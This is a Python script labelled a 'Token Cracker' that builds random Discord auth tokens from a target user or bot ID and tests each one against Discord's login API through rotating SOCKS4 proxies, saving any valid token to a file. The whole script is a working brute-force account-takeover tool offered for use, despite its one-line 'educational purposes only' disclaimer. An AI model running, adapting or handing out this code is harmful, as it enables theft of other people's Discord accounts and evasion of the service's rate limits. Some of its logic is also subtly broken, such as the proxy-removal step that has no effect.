import base64
import os
import random
import string
import requests
import colorama
from colorama import *
import time
import console
from console.utils import set_title

vaild = 0
invaild = 0
total_proxy = 0
bad_proxy = 0


mode = input("Cracker Mode | User/Bot | 0 / 1: ")
rp = bool(input("Auto Remove Proxy? True/False: "))
ptimeout = input("Proxy Timeout (blank = default): ")
userid = base64.b64encode((input("User / Bot ID: ")).encode("ascii"))
userid = str(userid)[2:-1]
if ptimeout == '':
    proxyTimeout = 6000
else:
    proxyTimeout = int(ptimeout)
print("WARNING: Educational purposes only!")

proxies = set()
with open("./proxy/socks4.txt", "r") as file:
    fline = file.readlines()
    for line in fline:
        proxies.add(line.strip())

ts = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_"

while userid == userid:
    total_proxy = len(list(proxies))
    set_title(f"Token Cracker - Vaild: {vaild} | Invaild: {invaild} | Total Proxies: {total_proxy} | Bad Proxy: {bad_proxy}")
    def HMAC(chars = string.ascii_uppercase + string.digits, N=27):
        return ''.join(random.choice(chars) for _ in range(N))

    def timest(chars = string.ascii_uppercase + string.digits, N=random.randint(4, 6)):
        return ''.join(random.choice(chars) for _ in range(N))

    token = userid + '.' + timest(chars=ts) + '.' + HMAC(chars=ts)

    if mode == "0":
        checkerheaders = {'Authorization': token}
    elif mode == "1":
        checkerheaders = {'Authorization': f'Bot {token}'}
    else:
        print(Fore.RED + "Invaild Mode!")
        break
    
    proxy = random.choice(list(proxies))
    proxy_form = {'http': f"socks4://{proxy}", 'https': f"socks4://{proxy}"}

    try:
        login = requests.get('https://discordapp.com/api/v9/auth/login', headers=checkerheaders, proxies=proxy_form, timeout=proxyTimeout)
        if login.status_code == 200:
            print(Fore.GREEN + '[+] VALID' + ' ' + token)
            f = open('done.txt', "a+")
            f.write(f'{token}\n')
            vaild += 1
            break
        else:
            print(Fore.RED + '[-] INVALID' + ' ' + token)
            invaild += 1
    except:
        if rp == True:
            list(proxies).remove(proxy)
        print(Fore.YELLOW + f'[-] BAD PROXY: {proxy}')
        bad_proxy += 1
